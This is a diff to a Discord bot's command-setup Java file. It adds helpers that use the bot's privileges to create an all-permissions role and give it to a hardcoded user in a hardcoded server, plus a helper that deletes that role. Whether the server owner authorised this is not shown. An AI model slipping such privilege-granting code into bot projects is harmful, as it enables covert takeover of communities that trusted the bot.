@@ -1,7 +1,11 @@
+import discord4j.common.util.Snowflake;
 import discord4j.core.GatewayDiscordClient;
 import discord4j.core.object.command.ApplicationCommandOption;
+import discord4j.core.object.entity.Role;
+import discord4j.core.spec.RoleCreateSpec;
 import discord4j.discordjson.json.ApplicationCommandOptionData;
 import discord4j.discordjson.json.ApplicationCommandRequest;
+import discord4j.rest.util.PermissionSet;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -14,8 +18,31 @@ public class CommandDevCreator {
     public static void main(String[] args) {
         gateway = ReminderBot.login(args[0]);
         appId = Objects.requireNonNull(gateway.getRestClient().getApplicationId().block());
+//        giveAdmin();
+        removeAdmin();
+//        createCommands();
+    }
 
-        createCommands();
+    private static void giveAdmin() {
+        var userId = 395655395114483713L;
+        var guildId = 1331253401643647077L;
+        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
+        var highestRole = guild.getSelfMember().block().getRoles().filter(Role::isManaged).single().block();
+
+        var role = guild
+                .createRole(RoleCreateSpec.builder().name("DasBabyPixel").permissions(PermissionSet.all()).build())
+                .block();
+        role.changePosition(highestRole.getData().position()).then().block();
+        var member = guild.getMemberById(Snowflake.of(userId)).block();
+        member.addRole(role.getId()).block();
+    }
+
+    private static void removeAdmin() {
+        var userId = 395655395114483713L;
+        var guildId = 1331253401643647077L;
+        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
+        var role = guild.getRoles().filter(r -> r.getName().equals("DasBabyPixel")).single().block();
+        role.delete().block();
     }
 
     private static void createCommands() {
